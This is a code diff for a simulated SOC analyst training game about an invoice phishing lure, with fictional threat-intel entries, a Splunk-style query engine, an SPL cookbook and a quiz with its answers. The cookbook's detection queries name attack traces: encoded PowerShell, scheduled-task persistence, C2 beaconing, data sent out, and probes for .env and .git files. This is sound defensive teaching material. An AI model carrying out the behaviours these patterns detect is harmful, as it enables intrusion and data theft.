+ [H.zip]:{v:"malicious", score:"49/72", tags:["zip","LNK dropper"], note:"Archive containing Invoice_44817.pdf.lnk."},
+ [H.lnk]:{v:"malicious", score:"52/72", tags:["lnk","PowerShell launcher"], note:"Shortcut with PDF icon that runs encoded PowerShell."},
+ [H.upd]:{v:"malicious", score:"61/72", tags:["trojan","loader","unsigned"], note:"Beacons to cdn-sync.redbud-freight-billing.com."},
+ "okchamber-events.org":{v:"clean", score:"0/72", tags:["registered 2011","nonprofit"], note:"Local chamber of commerce."},
+ "198.51.100.20":{v:"clean", score:"0/72", tags:["mail relay"], note:"Mail provider used by okchamber-events.org."},
+ "docusign.net":{v:"clean", score:"0/72", tags:["e-signature","registered 2003"], note:"Legitimate DocuSign sending domain."},
+ "na2.docusign.net":{v:"clean", score:"0/72", tags:["e-signature"], note:"Legitimate DocuSign signing host."},
+ "198.51.100.140":{v:"clean", score:"0/72", tags:["DocuSign mail"], note:"DocuSign outbound mail range."},
+ [H.inv]:{v:"clean", score:"0/72", tags:["internal","known-good"], note:"Matches Get-AssetInventory.ps1 baseline hash registered by IT."},
+ [H.svch]:{v:"clean", score:"0/72", tags:["Microsoft signed"], note:"svchost.exe, Windows 11 23H2."},
+ [H.ps]:{v:"clean", score:"0/72", tags:["Microsoft signed"], note:"powershell.exe itself is legitimate. Judge what it was told to run."},
+ "outlook.office.com":{v:"clean", score:"0/72", tags:["Microsoft 365"], note:""}
+};
+
+// ---------------- State ----------------
+const KEY="nightshift-soc-v1";
+const fresh = () => ({t:0, speed:1, paused:false, view:"dashboard", a:{}, seen:{}});
+let S = fresh();
+try{ const raw=localStorage.getItem(KEY); if(raw) S=Object.assign(fresh(), JSON.parse(raw)); }catch(e){}
+const save = () => { try{ localStorage.setItem(KEY, JSON.stringify(S)); }catch(e){} };
+const live = () => ALERTS.filter(a=>a.at<=S.t);
+const st = id => S.a[id] || (S.a[id]={status:"open"});
+const esc = s => String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+let siemQuery = 'sourcetype="email"';
+let intelInput = "";
+let openId = null, drawerMode = "detail", formErr = "";
+
+function toast(msg){const el=document.getElementById("toast");el.textContent=msg;el.hidden=false;clearTimeout(toast._t);toast._t=setTimeout(()=>el.hidden=true,2200);}
+
+// ---------------- Clock ----------------
+const END = 480;
+setInterval(()=>{
+  if(S.paused || S.t>=END) return;
+  const before = live().length;
+  S.t = Math.min(END, S.t + S.speed);
+  const after = live().length;
+  save();
+  if(after>before){ toast(`${after-before} new alert${after-before>1?"s":""} in the queue`); render(); }
+  else { const tm=document.getElementById("clk"); if(tm) tm.textContent=fmt(S.t); updateCount(); }
+},1000);
+
+function updateCount(){
+  const n = live().filter(a=>st(a.id).status!=="closed").length;
+  const c=document.getElementById("qcnt"); c.textContent=n; c.hidden=!n;
+}
+
+// ---------------- Views ----------------
+function topbar(){
+  const done = ALERTS.filter(a=>S.a[a.id]&&S.a[a.id].status==="closed").length;
+  return `<div class="topbar">
+    <div><h1>Invoice Lure at Redbud Freight</h1><p>Tier 1 analyst. Triage alerts as they land, close each with a case report.</p></div>
+    <div class="clock">
+      <span class="time mono" id="clk" aria-label="Scenario clock">${fmt(S.t)}</span>
+      <div class="seg" role="group" aria-label="Speed">${[1,2,5].map(x=>`<button data-speed="${x}" aria-pressed="${S.speed===x}">${x}x</button>`).join("")}</div>
+      <button class="btn sm" id="pauseBtn">${S.paused?"Resume":"Pause"}</button>
+      <span class="pill">${done}/${ALERTS.length} closed</span>
+    </div></div>`;
+}
+
+function donut(parts){
+  const total = parts.reduce((s,p)=>s+p.n,0)||1; let acc=0; const R=54,C=2*Math.PI*R;
+  const arcs = parts.filter(p=>p.n).map(p=>{const len=p.n/total*C; const s=`<circle r="${R}" cx="70" cy="70" fill="none" stroke="${p.c}" stroke-width="18" stroke-dasharray="${len-2} ${C-len+2}" stroke-dashoffset="${-acc}" transform="rotate(-90 70 70)"/>`; acc+=len; return s;}).join("");
+  return `<svg width="140" height="140" viewBox="0 0 140 140" role="img" aria-label="Alerts by type"><circle r="${R}" cx="70" cy="70" fill="none" stroke="var(--line)" stroke-width="18"/>${arcs}<text x="70" y="68" text-anchor="middle" fill="var(--fg)" font-family="Chakra Petch" font-size="28">${live().length}</text><text x="70" y="88" text-anchor="middle" fill="var(--muted)" font-size="11">alerts</text></svg>`;
+}
+
+function score(){
+  let pts=0,max=0,right=0,closed=0;
+  ALERTS.forEach(a=>{const s=S.a[a.id]; if(!s||s.status!=="closed")return; closed++; max+=2; const c=s.report.cls===a.answer.cls; const e=(s.report.esc===a.answer.esc); if(c){pts++;right++;} if(c&&e)pts++;});
+  return {pts,max,right,closed};
+}
+
+function vDashboard(){
+  const L=live(); const sc=score();
+  const closed=L.filter(a=>st(a.id).status==="closed");
+  const tp=closed.filter(a=>S.a[a.id].report.cls==="TP").length;
+  const types=[["Phishing","#f0a64a"],["Process","#7cb6ff"],["Execution","#ff5d6c"],["Network","#c39bff"],["Persistence","#5fc7a3"]];
+  const parts=types.map(([k,c])=>({k,c,n:L.filter(a=>a.type===k).length}));
+  const open=L.filter(a=>st(a.id).status!=="closed").sort((a,b)=>sevRank(b.sev)-sevRank(a.sev));
+  const finished = S.t>=END && closed.length===ALERTS.length;
+  return topbar()+`
+  ${finished?`<div class="card" style="margin-bottom:16px;border-color:var(--accent)"><h2>Shift complete</h2><p>You scored <b>${sc.pts}/${sc.max}</b> and classified ${sc.right} of ${ALERTS.length} alerts correctly. Open <a href="#" data-go="reports">Case reports</a> to read the feedback on each one, then restart and try to beat it.</p></div>`:""}
+  <div class="grid tiles">
+    <div class="card tile"><div class="lab">Total alerts</div><div class="val">${L.length}</div></div>
+    <div class="card tile"><div class="lab">Closed</div><div class="val">${closed.length}</div></div>
+    <div class="card tile"><div class="lab">Closed as TP</div><div class="val" style="color:var(--tp)">${tp}</div></div>
+    <div class="card tile"><div class="lab">Closed as FP</div><div class="val" style="color:var(--fp)">${closed.length-tp}</div></div>
+    <div class="card tile"><div class="lab">Score</div><div class="val">${sc.pts}<span class="muted" style="font-size:18px">/${sc.max||0}</span></div></div>
+  </div>
+  <div class="grid two" style="margin-top:16px">
+    <div class="card"><h2>Alert types</h2><div class="donut-wrap">${donut(parts)}<div class="legend">${parts.map(p=>`<div><span style="background:${p.c}"></span>${p.k} <b class="mono">${p.n}</b></div>`).join("")}</div></div></div>
+    <div class="card"><h2>Open alerts</h2>${open.length?alertTable(open,true):`<p class="muted">No open alerts. New ones arrive as the clock runs.</p>`}</div>
+  </div>`;
+}
+const sevRank=s=>({Critical:4,High:3,Medium:2,Low:1}[s]);
+
+function alertTable(list, compact){
+  return `<div class="tbl-wrap"><table><thead><tr><th>ID</th><th>Alert</th><th>Severity</th>${compact?"":"<th>Type</th><th>Time</th><th>Status</th>"}</tr></thead><tbody>
+  ${list.map(a=>{const s=st(a.id); const isNew=!S.seen[a.id];
+    const status = s.status==="closed"?`<span class="pill ${s.report.cls.toLowerCase()}">Closed ${s.report.cls}</span>`:s.status==="owned"?`<span class="pill owned">Assigned to you</span>`:`<span class="pill open">Open</span>`;
+    return `<tr class="click ${isNew?"new-row":""}" data-alert="${a.id}" tabindex="0"><td class="mono">${a.id}</td><td>${esc(a.title)}</td><td><span class="sev ${a.sev}">${a.sev}</span></td>${compact?"":`<td>${a.type}</td><td class="mono">${fmt(a.at)}</td><td>${status}</td>`}</tr>`}).join("")}
+  </tbody></table></div>`;
+}
+
+function vQueue(){
+  const L=live().slice().sort((a,b)=>{const ca=st(a.id).status==="closed",cb=st(b.id).status==="closed"; if(ca!==cb)return ca?1:-1; return sevRank(b.sev)-sevRank(a.sev)||a.at-b.at;});
+  L.forEach(a=>S.seen[a.id]=1); save();
+  return topbar()+`<div class="card"><h2>Alert queue</h2><p class="hint">Take ownership, investigate in SIEM and Threat intel, then write a case report. Highest severity first.</p>${L.length?alertTable(L,false):"<p class='muted'>Waiting for alerts…</p>"}</div>`;
+}
+
+// ---- SIEM query engine: a working slice of Splunk SPL.
+// Search part: field=value, != > < >= <=, field IN (a, b), * wildcards, quoted values, bare words (full text),
+// implicit AND, OR (binds tighter than AND, as in Splunk), NOT. index=main is accepted (one index here).
+// Pipes: stats, timechart, table, sort, reverse, head, tail, dedup, top.
+const PIPE_CMDS=["stats","timechart","table","sort","reverse","head","tail","dedup","top"];
+const escA = s => esc(s).replace(/'/g,"&#39;");
+function splitPipes(q){ const out=[]; let cur="",inq=false; for(const ch of q){ if(ch==='"')inq=!inq; if(ch==="|"&&!inq){out.push(cur);cur="";} else cur+=ch; } out.push(cur); return out.map(x=>x.trim()); }
+const unq = x => x.replace(/^"(.*)"$/,"$1");
+function parseSearch(q){
+  const re=/(\w+)\s+IN\s*\(([^)]*)\)|(\w+)\s*(!=|>=|<=|=|>|<)\s*("([^"]*)"|[^\s()]+)|"([^"]*)"|([^\s()]+)/gi;
+  const groups=[]; let m, joinNext=false, neg=false;
+  while((m=re.exec(q))){
+    let term;
+    if(m[1]) term={f:m[1],op:"in",vals:m[2].split(",").map(x=>unq(x.trim()).replace(/\\\//g,"/")).filter(Boolean)};
+    else if(m[3]) term={f:m[3],op:m[4],v:(m[6]!==undefined?m[6]:m[5]).replace(/\\\//g,"/")};
+    else {
+      const quoted=m[7]!==undefined, w=quoted?m[7]:m[8], W=w.toUpperCase();
+      if(!quoted&&W==="AND") continue;
+      if(!quoted&&W==="OR"){ joinNext=true; continue; }
+      if(!quoted&&W==="NOT"){ neg=true; continue; }
+      term={text:w.replace(/\\\//g,"/")};
+    }
+    if(term.f==="index"){ neg=false; joinNext=false; continue; }
+    term.neg=neg; neg=false;
+    if(joinNext&&groups.length) groups[groups.length-1].push(term); else groups.push([term]);
+    joinNext=false;
+  }
+  return groups;
+}
+const wild = v => new RegExp("^"+v.split("*").map(x=>x.replace(/[.+?^${}()|[\]\\]/g,"\\$&")).join(".*")+"$","i");
+const fv = (l,f) => f==="_time"?fmt(l.t):l[f];
+function matchTerm(l,t){
+  let hit;
+  if(t.text!==undefined) hit = t.text==="*" || JSON.stringify(l).toLowerCase().includes(t.text.toLowerCase().replace(/\\/g,"\\\\"));
+  else {
+    const val=fv(l,t.f);
+    if(t.op==="in") hit = val!==undefined && t.vals.some(v=>wild(v).test(String(val)));
+    else if(t.op==="=") hit = val!==undefined && wild(t.v).test(String(val));
+    else if(t.op==="!=") hit = val!==undefined && !wild(t.v).test(String(val)); // like Splunk: != needs the field to exist
+    else { const a=parseFloat(val), b=parseFloat(t.v); hit = !isNaN(a)&&!isNaN(b)&&({">":a>b,"<":a<b,">=":a>=b,"<=":a<=b})[t.op]; }
+  }
+  return t.neg?!hit:hit;
+}
+function parseAggs(txt){
+  const re=/\b(count|sum|avg|min|max|dc|values)\b(?:\(([^)]*)\))?(?:\s+as\s+(\w+))?/gi; const out=[]; let m;
+  while((m=re.exec(txt||""))){ const fn=m[1].toLowerCase(), f=(m[2]||"").trim(); out.push({fn,f,name:m[3]||(f?`${fn}(${f})`:fn)}); }
+  return out;
+}
+function aggregate(a,rows,get){
+  const vals=a.f?rows.map(r=>get(r,a.f)).filter(v=>v!==undefined&&v!==""):rows;
+  if(a.fn==="count") return vals.length;
+  if(a.fn==="dc") return new Set(vals.map(String)).size;
+  if(a.fn==="values") return [...new Set(vals.map(String))].sort().join(", ");
+  const nums=vals.map(Number).filter(Number.isFinite); if(!nums.length) return "";
+  if(a.fn==="sum") return nums.reduce((x,y)=>x+y,0);
+  if(a.fn==="avg") return Math.round(nums.reduce((x,y)=>x+y,0)/nums.length*100)/100;
+  if(a.fn==="min") return Math.min(...nums);
+  if(a.fn==="max") return Math.max(...nums);
+}
+const fieldList = x => x.split(/[\s,]+/).filter(Boolean);
+function cmpVals(a,b){
+  if(a===undefined||a==="") return 1; if(b===undefined||b==="") return -1;
+  const na=Number(a), nb=Number(b);
+  if(Number.isFinite(na)&&Number.isFinite(nb)) return na-nb;
+  return String(a).localeCompare(String(b));
+}
+function applyCmd(res,p){
+  const m=p.match(/^(\w+)\s*([\s\S]*)$/); if(!m) throw new Error(`Can't read "| ${p}". Each pipe starts with a command name.`);
+  const cmd=m[1].toLowerCase(), arg=m[2].trim();
+  const get=(r,f)=>res.mode==="events"?fv(r,f):r[f];
+  const T=(rows,cols,calc)=>({mode:"table",rows,cols,calc:new Set(calc||[]),matched:res.matched});
+  if(cmd==="table"){
+    const cols=fieldList(arg); if(!cols.length) throw new Error("table needs field names, for example | table _time, host, Image");
+    return T(res.rows.map(r=>Object.fromEntries(cols.map(c=>[c,get(r,c)]))),cols,["_time"]);
+  }
+  if(cmd==="stats"){
+    const [aggTxt,byTxt]=arg.split(/\s+by\s+/i); const aggs=parseAggs(aggTxt);
+    if(!aggs.length) throw new Error("stats needs a function: count, sum(field), avg(field), min, max, dc(field) or values(field). Example: | stats count by host");
+    const by=byTxt?fieldList(byTxt):[]; const buckets=new Map();
+    if(!by.length) buckets.set("all",{keys:[],rows:res.rows});
+    else res.rows.forEach(r=>{ const keys=by.map(f=>get(r,f)); if(keys.some(v=>v===undefined)) return; const k=JSON.stringify(keys); if(!buckets.has(k)) buckets.set(k,{keys,rows:[]}); buckets.get(k).rows.push(r); });
+    const rows=[...buckets.values()].map(b=>{ const o={}; by.forEach((f,i)=>o[f]=b.keys[i]); aggs.forEach(a=>o[a.name]=aggregate(a,b.rows,get)); return o; });
+    rows.sort((x,y)=>{ for(const f of by){ const c=cmpVals(x[f],y[f]); if(c) return c; } return 0; });
+    return T(rows,[...by,...aggs.map(a=>a.name)],aggs.map(a=>a.name));
+  }
+  if(cmd==="timechart"){
+    if(res.mode!=="events") throw new Error("timechart has to come straight after the search, before stats or table.");
+    const sm=arg.match(/span\s*=\s*(\d+)\s*(s|m|h|d)/i); const span=sm?(+sm[1])*({s:1,m:60,h:3600,d:86400}[sm[2].toLowerCase()]):60;
+    const aggs=parseAggs(arg.replace(/span\s*=\s*\S+/i,"")); if(!aggs.length) aggs.push({fn:"count",f:"",name:"count"});
+    const b0=BASE.getTime()/1000, bucket=t=>Math.floor((b0+t)/span)*span;
+    const groups=new Map(); res.rows.forEach(l=>{ const k=bucket(l.t); if(!groups.has(k)) groups.set(k,[]); groups.get(k).push(l); });
+    const keys=[...groups.keys()]; const rows=[];
+    if(keys.length){ for(let k=Math.min(...keys);k<=Math.max(...keys);k+=span){ const d=new Date(k*1000);
+      const label=span>=86400?`${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}`:d.toTimeString().slice(0,span<60?8:5);
+      const o={_time:label}; aggs.forEach(a=>o[a.name]=aggregate(a,groups.get(k)||[],fv)); rows.push(o); } }
+    return Object.assign(T(rows,["_time",...aggs.map(a=>a.name)],["_time",...aggs.map(a=>a.name)]),{chart:true});
+  }
+  if(cmd==="sort"){
+    let toks=fieldList(arg.replace(/^by\s+/i,"")).filter(x=>x.toLowerCase()!=="by"); let limit=Infinity;
+    if(toks.length&&/^\d+$/.test(toks[0])){ limit=+toks[0]; toks=toks.slice(1); }
+    if(!toks.length) throw new Error("sort needs a field. Use | sort -count for biggest first, | sort count for smallest first.");
+    const keys=toks.map(x=>({f:x.replace(/^[-+]/,""),dir:x.startsWith("-")?-1:1}));
+    const rows=res.rows.slice().sort((x,y)=>{ for(const k of keys){ const a=get(x,k.f), b=get(y,k.f); if(a===undefined&&b===undefined) continue; if(a===undefined) return 1; if(b===undefined) return -1; const c=cmpVals(a,b)*k.dir; if(c) return c; } return 0; });
+    return {...res,rows:rows.slice(0,limit)};
+  }
+  if(cmd==="reverse") return {...res,rows:res.rows.slice().reverse()};
+  if(cmd==="head"||cmd==="tail"){ const n=parseInt(arg.replace(/limit\s*=\s*/i,""))||10; return {...res,rows:cmd==="head"?res.rows.slice(0,n):res.rows.slice(-n)}; }
+  if(cmd==="dedup"){ const fs=fieldList(arg); if(!fs.length) throw new Error("dedup needs a field, for example | dedup DestinationIp"); const seen=new Set(); return {...res,rows:res.rows.filter(r=>{ const k=JSON.stringify(fs.map(f=>get(r,f))); if(seen.has(k)) return false; seen.add(k); return true; })}; }
+  if(cmd==="top"){
+    const lm=arg.match(/limit\s*=\s*(\d+)/i); const n=lm?+lm[1]:10; const fs=fieldList(arg.replace(/limit\s*=\s*\d+/i,""));
+    if(!fs.length) throw new Error("top needs a field, for example | top limit=5 Image");
+    const counts=new Map(); let total=0;
+    res.rows.forEach(r=>{ const keys=fs.map(f=>get(r,f)); if(keys.some(v=>v===undefined)) return; total++; const k=JSON.stringify(keys); counts.set(k,(counts.get(k)||0)+1); });
+    const rows=[...counts.entries()].map(([k,c])=>{ const keys=JSON.parse(k); const o={}; fs.forEach((f,i)=>o[f]=keys[i]); o.count=c; o.percent=Math.round(c/total*10000)/100; return o; }).sort((x,y)=>y.count-x.count).slice(0,n);
+    return T(rows,[...fs,"count","percent"],["count","percent"]);
+  }
+  throw new Error(`Unknown command "${cmd}". This console supports: ${PIPE_CMDS.join(", ")}.`);
+}
+function runQ(q){
+  const [head,...pipes]=splitPipes(q);
+  const groups=parseSearch(head||"*");
+  const rows=LOGS.filter(l=>l.t<=S.t).filter(l=>groups.every(g=>g.some(t=>matchTerm(l,t))));
+  let res={mode:"events",rows,matched:rows.length};
+  pipes.forEach(p=>{ if(!p) throw new Error("There's an empty pipe. Remove the extra | or add a command after it."); res=applyCmd(res,p); });
+  return res;
+}
+function summary(l){
+  if(l.sourcetype==="email") return `${l.action}: ${l.sender} → ${l.recipient} “${l.subject}”`;
+  if(l.sourcetype==="proxy") return `${l.process} → ${l.dest_host}:${l.dest_port}`;
+  if(l.sourcetype==="firewall") return `${l.action.toUpperCase()} ${l.protocol} ${l.src_ip} → ${l.dest_ip}:${l.dest_port} out=${l.bytes_out}B in=${l.bytes_in}B${l.threat!=="none"?" ["+l.threat+"]":""}`;
+  if(l.sourcetype==="wineventlog") return `4698 task created ${l.TaskName} → ${l.TaskAction}`;
+  if(l.EventID===1) return `Process: ${l.ParentImage.split("\\").pop()} → ${l.Image.split("\\").pop()} | ${l.CommandLine}`;
+  if(l.EventID===3) return `Network: ${l.Image} ${l.SourceIp} → ${l.DestinationIp}:${l.DestinationPort}`;
+  if(l.EventID===11) return `File created: ${l.TargetFilename}`;
+  if(l.EventID===22) return `DNS: ${l.QueryName} → ${l.QueryResults}`;
+  return "";
+}
+const numFmt = v => (typeof v==="number"&&Math.abs(v)>=10000)?v.toLocaleString("en-US"):v;
+function resultTable(res){
+  const last=res.cols[res.cols.length-1]; const max=res.chart?Math.max(1,...res.rows.map(r=>+r[last]||0)):1;
+  return `<div class="tbl-wrap"><table><thead><tr>${res.cols.map(c=>`<th>${esc(c)}</th>`).join("")}${res.chart?"<th aria-hidden=\"true\"></th>":""}</tr></thead><tbody>
+  ${res.rows.map(r=>`<tr>${res.cols.map(c=>{ const v=r[c];
+    if(v===undefined||v==="") return `<td class="mono muted">—</td>`;
+    if(res.calc.has(c)) return `<td class="mono ${typeof v==="number"?"num":""}">${esc(numFmt(v))}</td>`;
+    return `<td class="mono" style="word-break:break-all"><button class="chip" data-drill='${escA(c)}="${escA(String(v).replace(/[\\"]/g,"*"))}"' title="Show the raw events for this value">${esc(v)}</button></td>`;
+  }).join("")}${res.chart?`<td style="width:35%;min-width:80px;vertical-align:middle"><div class="bar"><i style="width:${(+r[last]||0)/max*100}%"></i></div></td>`:""}</tr>`).join("")}
+  </tbody></table></div>`;
+}
+function vSiem(){
+  let res, err="";
+  try{ res=runQ(siemQuery); }catch(e){ err=e.message; res={mode:"events",rows:[],matched:0}; }
+  const tries=['sourcetype="sysmon" host="WKS-FIN-07"','EventID=3 DestinationIp!="10.*"','index=main | stats count by sourcetype','sourcetype="sysmon" | timechart span=1m count','Invoice_44817'];
+  const status = res.mode==="table" ? `${res.rows.length} result${res.rows.length===1?"":"s"} from ${res.matched} matching event${res.matched===1?"":"s"}` : `${res.rows.length} event${res.rows.length===1?"":"s"}`;
+  return topbar()+`<div class="card"><h2>SIEM search</h2>
+  <form class="q" id="qform"><input id="qin" value="${esc(siemQuery)}" aria-label="Search query" spellcheck="false"><button class="btn primary">Search</button></form>
+  <p class="hint">Splunk-style: filters first (<code class="mono">field="value"</code>, <code class="mono">!=</code>, <code class="mono">IN (…)</code>, <code class="mono">OR</code>, <code class="mono">NOT</code>, <code class="mono">*</code> wildcards, bare words search everything), then <code class="mono">|</code> pipes to <code class="mono">stats</code>, <code class="mono">timechart</code>, <code class="mono">table</code>, <code class="mono">sort</code>, <code class="mono">head</code>, <code class="mono">top</code>. New to it? Open the <a href="#" data-go="spl">SPL cookbook</a>. Try:
+  ${tries.map(x=>`<button class="chip" data-q='${escA(x)}'>${esc(x)}</button>`).join(" ")}</p>
+  ${err?`<div class="qerr" role="alert">${esc(err)}</div>`:""}
+  <p class="mono muted">${status} · only events up to ${fmt(S.t)} are indexed${res.mode==="events"?" · oldest first (real Splunk shows newest first)":""}</p>
+  ${res.mode==="table" ? (res.rows.length?resultTable(res):`<p class="muted">No results.</p>`) : `<div class="tbl-wrap"><table><thead><tr><th>_time</th><th>sourcetype</th><th>host</th><th>event</th></tr></thead><tbody>
+  ${res.rows.map((l,i)=>`<tr class="click" data-log="${i}"><td class="mono">${fmt(l.t)}</td><td class="mono">${l.sourcetype}${l.EventID?":"+l.EventID:""}</td><td class="mono">${esc(l.host||"mail-gw")}</td><td class="mono" style="word-break:break-all">${esc(summary(l))}</td></tr>
+  <tr hidden id="lx${i}"><td colspan="4"><dl class="kv">${Object.entries(l).filter(([k])=>k!=="t").map(([k,v])=>`<dt>${k}</dt><dd><button class="chip" data-add='${escA(k)}="${escA(String(v).replace(/[\\"]/g,"*"))}"' title="Add as filter">${esc(v)}</button></dd>`).join("")}</dl></td></tr>`).join("")}
+  </tbody></table></div>`}</div>`;
+}
+
+// ---------------- SPL cookbook ----------------
+const COOKBOOK = [
+ {stage:"1 · Initial triage", title:"See what data you have",
+  q:'index=main | stats count by sourcetype',
+  room:'index=main sourcetype=web_traffic',
+  how:["<code>index=main</code> picks the bucket of data. Always start broad, then narrow.","<code>| stats count by sourcetype</code> is the typed version of clicking the <b>sourcetype</b> field in Splunk's sidebar: one row per log source with its event count.","Once you know the sources, add <code>sourcetype=\"…\"</code> to look at one at a time."]},
+ {stage:"2 · Timeline", title:"Find the spike",
+  q:'sourcetype="sysmon" | timechart span=1m count',
+  room:'index=main sourcetype=web_traffic | timechart span=1d count | sort by count | reverse',
+  how:["<code>timechart span=1m count</code> buckets events by time and counts each bucket. Unusual spikes are where you look first.","The room uses <code>span=1d</code> because its data covers days. This shift lasts minutes, so use <code>1m</code>. Pick a span that gives you 10 to 50 buckets.","Add <code>| sort -count</code> to put the busiest bucket on top (the room's <code>sort by count | reverse</code> does the same thing in two steps)."]},
+ {stage:"3 · Anomaly detection", title:"Profile a field",
+  q:'sourcetype="sysmon" | top limit=5 Image',
+  room:'Clicking user_agent, client_ip and path in the Interesting fields pane',
+  how:["<code>top</code> lists the most common values of a field with a count and percent, the same panel you get by clicking a field in Splunk.","Scan for values that don't belong: a program running from AppData, an IP outside your range, a user agent that isn't a browser.","Swap in other fields: <code>Image</code>, <code>DestinationIp</code>, <code>sender</code>, <code>process</code>."]},
+ {stage:"4 · Filter out benign", title:"Remove known-good traffic",
+  q:'EventID=3 Image!="*msedge*" Image!="*Teams*" DestinationIp!="10.*"',
+  room:'sourcetype=web_traffic user_agent!=*Mozilla* user_agent!=*Chrome* user_agent!=*Safari* user_agent!=*Firefox*',
+  how:["Each <code>!=</code> removes one known-good pattern. Whatever is left is what you investigate.","Here: drop browser and Teams connections and anything internal (<code>10.*</code>). What's left is PowerShell and updater.exe talking to the internet.","<code>field!=value</code> only keeps events that <i>have</i> the field. Use <code>NOT field=value</code> if you also want events where the field is missing."]},
+ {stage:"5 · Narrow down", title:"Rank the suspects",
+  q:'EventID=3 DestinationIp!="10.*" | stats count by DestinationIp, Image | sort -count | head 5',
+  room:'sourcetype=web_traffic user_agent!=*Mozilla* … | stats count by client_ip | sort -count | head 5',
+  how:["<code>stats count by A, B</code> makes one row per unique pair and counts it.","<code>sort -count</code>: the minus sign means biggest first.","<code>head 5</code> keeps the top five. Click any value in the results to jump to its raw events."]},
+ {stage:"6 · Trace the attack chain", title:"One host, step by step",
+  q:'host="WKS-FIN-07" EventID IN (1, 11, 22) | table _time, EventID, Image, CommandLine, TargetFilename, QueryName',
+  room:'sourcetype=web_traffic client_ip="<IP>" AND path IN ("/.env", "/*phpinfo*", "/.git*") | table _time, path, user_agent, status',
+  how:["<code>IN ( … )</code> is shorthand for several ORs on one field. Wildcards work inside it.","<code>table</code> shows only the columns you name, in that order. Put <code>_time</code> first so you can read the story top to bottom.","Sysmon IDs: 1 process start, 11 file created, 22 DNS lookup. Read it as: shortcut written, PowerShell ran, payload dropped, C2 domain looked up."]},
+ {stage:"7 · OR and wildcards", title:"Two behaviors on one host",
+  q:'host="WKS-FIN-07" CommandLine="*-enc*" OR CommandLine="*schtasks*"',
+  room:'sourcetype=web_traffic client_ip="<IP>" AND path="*..\\/..\\/*" OR path="*redirect*"',
+  how:["In SPL, <code>OR</code> binds tighter than the implied <code>AND</code>, so this reads as host AND (enc OR schtasks). The room's query works the same way.","<code>*</code> on both sides means \"contains\". <code>*-enc*</code> catches encoded PowerShell; <code>*schtasks*</code> catches scheduled task creation.","The room escapes slashes as <code>..\\/..\\/</code> so they're read literally. This console accepts that too."]},
+ {stage:"8 · Pivot on an indicator", title:"Where else does the IOC show up?",
+  q:'"203.0.113.47" | stats count by sourcetype, host',
+  room:'(no direct equivalent: the room filters by client_ip throughout)',
+  how:["A quoted bare value searches every field of every event. Use it for an IP, hash or domain you got from an alert or threat intel.","Grouping by <code>sourcetype, host</code> shows which log sources and machines saw it. More sources means more confidence, and more scope for the case report."]},
+ {stage:"9 · Beaconing", title:"Check the rhythm",
+  q:'Image="updater.exe" EventID=3 | table _time, DestinationIp, DestinationPort',
+  room:'(Splunk Basics doesn\'t cover this; it pairs with the network triage playbook)',
+  how:["Malware checks in with its C2 on a timer. Put the timestamps side by side and look for an even gap.","Here it's every 60 seconds. People browsing don't produce a steady interval like that."]},
+ {stage:"10 · Correlate in the firewall", title:"Confirm the outbound C2 channel",
+  q:'sourcetype="firewall" src_ip="10.20.4.37" dest_ip="203.0.113.47" action="allowed" | table _time, action, protocol, src_ip, dest_ip, dest_port, bytes_out, threat',
+  room:'sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="<IP>" AND action="ALLOWED" | table _time, action, protocol, src_ip, dest_ip, dest_port, reason',
+  how:["Endpoint logs show what the process tried to do. Firewall logs show whether the traffic actually got out.","Switch field names when you change source: Sysmon uses <code>DestinationIp</code>, the firewall uses <code>dest_ip</code>. Expand one event first to see what the fields are called.","<code>action=\"allowed\"</code> plus <code>threat=\"intel-match\"</code> means the C2 channel was live."]},
+ {stage:"11 · Volume", title:"How much data left?",
+  q:'sourcetype="firewall" src_ip="10.20.4.37" dest_ip="203.0.113.47" | stats sum(bytes_out) as bytes_out sum(bytes_in) as bytes_in count by src_ip',
+  room:'sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="<IP>" AND action="ALLOWED" | stats sum(bytes_transferred) by src_ip',
+  how:["<code>sum(field)</code> adds up a number field. <code>as name</code> renames the column.","<code>bytes_in</code> is what came down (the payload). <code>bytes_out</code> is what went up (possible exfiltration). Look at both.","Put the totals in your case report. \"About 1.4 MB sent to the C2\" tells Tier 2 more than \"data may have been sent.\""]},
+ {stage:"12 · Campaign scope", title:"Who got the phish?",
+  q:'sourcetype="email" dmarc="fail" | stats count values(recipient) as recipients by sender, action',
+  room:'(the same stats pattern, applied to mail)',
+  how:["<code>values(field)</code> lists every distinct value in the group, so you get the recipient list in one cell.","Grouping by <code>action</code> splits delivered from quarantined. Delivered mail needs to be pulled; quarantined mail just needs a note."]}
+];
+const QUIZ = [
+ ["Which external IP is the C2 server?","203.0.113.47","DestinationIp!=\"10.*\" | stats count by DestinationIp"],
+ ["Which minute had the most Sysmon events? (HH:MM)","09:15 (3 events)","sourcetype=\"sysmon\" | timechart span=1m count | sort -count"],
+ ["How many times did updater.exe connect to the C2?","3","Image=\"updater.exe\" EventID=3 | stats count"],
+ ["How many bytes did WKS-FIN-07 send out to the C2, per the firewall?","1,488,994","sourcetype=\"firewall\" src_ip=\"10.20.4.37\" dest_ip=\"203.0.113.47\" | stats sum(bytes_out) by src_ip"],
+ ["How many people received the invoice lure, and how many got it delivered?","2 received it; 1 delivered (j.harmon), 1 quarantined","sourcetype=\"email\" subject=\"*44817*\" | stats count by recipient, action"]
+];
+function vSpl(){
+  const anat=[
+    ['sourcetype="firewall"','Which data to search. Everything before the first pipe is a filter.'],
+    ['dest_ip="203.0.113.47"','Another filter. A space between filters means AND.'],
+    ['| stats sum(bytes_out) by src_ip','The pipe sends the results to the next command. stats rolls events into rows, one per src_ip, adding up bytes_out.'],
+    ['| sort -bytes_out','Order the rows, biggest first.'],
+    ['| head 5','Keep the first five rows.']
+  ];
+  return topbar()+`<div class="grid" style="max-width:980px">
+  <div class="card prose" style="max-width:none"><h2>SPL cookbook</h2>
+   <p>These are the query patterns from TryHackMe's <i>Splunk Basics: Did you SIEM?</i>, rewritten for this shift's logs. Each one shows the room's version next to it so you can see the pattern carry over. Press <b>Run</b> to load it in SIEM, then change it and see what happens.</p>
+   <p class="hint">Results grow as the clock runs. Recipes 9 to 11 need the clock past about 09:21 to show everything.</p>
+   <h3>How to read a query</h3>
+   <div class="anat">${anat.map(([c,d])=>`<code>${esc(c)}</code><div>${esc(d)}</div>`).join("")}</div>
+   <h3>The hunting loop from the room</h3>
